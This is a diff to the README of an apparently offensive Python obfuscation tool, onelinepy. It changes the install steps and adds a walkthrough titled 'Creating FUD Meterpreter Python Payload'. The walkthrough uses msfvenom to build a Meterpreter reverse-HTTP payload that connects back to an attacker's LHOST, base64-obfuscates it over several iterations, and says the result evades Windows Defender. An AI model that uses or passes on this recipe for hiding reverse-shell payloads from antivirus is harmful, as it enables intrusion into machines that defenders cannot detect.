@@ -8,9 +8,9 @@
 ```sh
 git clone https://github.com/spicesouls/onelinepy
 cd onelinepy
-python3 -m pip install -r requirements.txt
-chmod +x oneline.py
-./oneline.py
+chmod +x setup.sh
+./setup.sh
+onelinepy
 ```
 
 ### Usage Guide
@@ -34,14 +34,26 @@ chmod +x oneline.py
 <b>  --output OUTPUT  Output File.</b>
 </pre>
 
-### Examples
+### Example: Creating FUD Meterpreter Python Payload
+
+1. Generate Python Payload:
+
+`msfvenom --payload python/meterpreter_reverse_http LHOST=... LPORT=... > payload.txt`
+
+2. Obfustucate Payload
+
+`onelinepy -m /one_line/base64 --script payload.txt -i 3 --output obfustucated_payload.txt`
+
+3. Profit! The Obfustucated Payload works against Windows Defender.
+
+### More Examples
 
 ```sh
-./oneline.py -m /one_line/base64 --script payload.py -i 3
+onelinepy -m /one_line/base64 --script payload.py -i 3
 ```
 
 ```sh
-./oneline.py -m /one_line/hex --code "print('HEX!')"
+onelinepy -m /one_line/hex --code "print('HEX!')"
 ```
 
 ### Obfustucation Method List
